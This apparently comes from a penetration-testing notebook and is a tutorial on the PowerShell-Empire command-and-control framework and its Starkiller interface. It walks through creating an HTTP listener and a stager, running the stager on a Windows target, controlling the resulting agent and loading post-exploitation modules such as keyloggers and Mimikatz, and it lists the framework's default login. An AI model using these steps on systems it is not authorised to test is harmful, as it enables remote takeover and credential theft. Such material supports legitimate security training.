# PowerShell-Empire Fundamentals

**PowerShell-Empire** is a pure PowerShell exploittation/post-exploitation framework built on cryptological-secure communications and flexible architecture.\
On the PowerShell side, Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.

### Starkiller

Starkiller is a GUI Frontend for the Powershell Empire. It is an Electron application written in VueJS and proved users with an intuitive way of interacting with Empire. \
It is include into Kali Linux.

### Things to know

#### _Listeners_

To allow Stagers to connect to the server, you need to create a Listener for them to connect back to. These Listeners will “listen” for a connection from an Empire Stager and generate an Agent when a Stager connects.

#### _Stagers_

#### Now that your Listener is up and running, you need to create a Stager. A Stager is a piece of code that executes a payload on the target machine, which connects back to your Listener. This payload contains the functionality needed to generate an Agent that lets you remotely control the compromised system while initiating the Encrypted Key Exchange protocol to protect the C2 communication. PowerShell Empire includes several different types of Stagers:

* Malicious scripts (.bat, .hta, .vbs, etc.)
* Dynamic Link Libraries (DLLs)
* Executables (.exe)
* Shellcode
* Microsoft Office macros
* Cross-platform stagers for Linux and macOS

#### Agents

Your Listener and Stager are now created. The final step is to execute the Stager you created on the target system. This will generate a new Agent once it connects back to the Empire Server, which allows you to control the target machine remotely.

First, transfer the Stager you created to the target machine. PowerShell Empire will tell you where this Stager was written to when you ran the `execute` command.



### Getting Start

Start up the empire server

```bash
powershell-empire server
```

In other terminal tab, start up the empire client

```
powershell-empire client
```

When both are connected we can open Starkiller app from Kali search menu.

```bash
stakiller
```

\
To connect starkiller to empire we must logon with this URL (https://localhost:1337 and this credential (empireadmin:password123).



## Use guide Empire Client/Server

### Setup a http listener

```bash
# in the empire client
# use empire http listener
userlistener http

# config host ip and port
set Host IP
set Port PORT

# start listener
execute

# list of listeners
listeners
```

### Setup a stager

```bash
# in the empire client
# return in the empire main page
main

# use empire stager
usestager multi/launcher

# set listener http in stager
set Listener http

# execute the stager
execute
```

Now the empire has generated a encoded powershell command to connect the target at the listener.

Copy the command and execute that in target windows shell.

```bash
# in the empire client
# view connected agents
agents
```

### Interact with the target

Once we have a target connected in our listener, we can interact with it.

```bash
# in the empire client
# select connected agent
interact NAME # name from 'agents' empire table
```

### Use module on target

Once we have in interact mode with target we can use a powershell module for post-explotation phase.

```bash
# in the empire client
# select module
usemodule MODULE_NAME
execute
```





## Use guide Starkiller

#### Listener creation

Click on "create" button and select the **type** (raccomanded http/http\_hop). Set the **IP** with our **kali machine ip**, **port** when we want that listener listen and the **name** of listener. Click on "**Submit**"

<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

Now we have a new listener and we can move on a stager creation.

#### Stager creation

Click on "create" button and select the stager type that we want create. \
Tha stager type depend from target OS. In this case we'll use **windows/csharp\_exe**, that consist in a creation of c# executable, because the our target is a Windows System.

Now, set the **listener** that we want use, change the **OutFile** name (is a name of .exe). Click on "**Submit**"

<figure><img src="../../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

The next step is Download a stager (right click on stager just created) and transfer into target machine (for example with a simple python web server).

As soon as the file was trasferred and run as administrator we can see that in the 'Agents' section of starkiller, an agent was created.

AGENT SECTION IMG

Raccomanded action is rename agent name.

#### Agents action

Once we have created a agent we can:

* Intect with it (remote command execution, execute a empire module)
* File browsing (View all file, upload a file, download a file)
* View all task executed on the target system.













